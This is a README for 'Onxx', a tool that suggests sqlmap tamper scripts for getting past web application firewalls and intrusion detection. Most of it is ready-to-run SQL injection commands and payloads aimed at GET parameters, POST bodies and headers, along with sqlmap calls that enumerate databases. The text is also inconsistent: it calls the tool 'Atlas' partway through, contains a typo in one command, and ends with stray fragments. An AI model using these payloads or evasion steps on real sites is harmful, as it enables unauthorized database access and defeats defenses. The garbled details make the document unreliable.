Onxx - Quick SQLMap By hari Jadhav 🦅 
---
![install](https://files.catbox.moe/c2xm8a.gif)
__Onxx__ is an open source tool that can suggest sqlmap tampers to bypass WAF/IDS/IPS, the tool is based on returned status code.


Installation
---
```
git clone https://github.com/onxx-x146/sqlmap.git
cd sqlmap
chmod +x onxx.py
python onxx.py
```
Usage
---
```
$ python onxx.py --url http://site.com/index.php?id=Price_ASC --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

injection point (with `%%inject%%`):

get:
```
$ python onxx.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

post:
```
$ python onxx.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

headers:
```
$ python onxxpy --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```


tampers concatenation:

```
$ python onxx.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
```

get tampers list:

```
$ python onxx.py -g
```


Example 
---
1. Run SQLMap:
```
$ python sqlmap.py -u 'http://hari.com/index.php?id=Price_ASC' --dbs --random-agent -v 3
```
![sqlmap](https://i.imgur.com/XP39Rqz.png)

```Price_ASC') AND 8716=4837 AND ('yajr'='yajr``` is blocked by WAF/IDS/IPS, now trying with Atlas:
```
$ python onxx.py --url 'http://hari.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
```
![atlas_succ](https://i.imgur.com/U6qEnXp.png)

At this point:

```
$ python sqlmap.py -u 'http://hari.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords,...
```

#### The new Update get will soon stay updated
$ BurpSuite
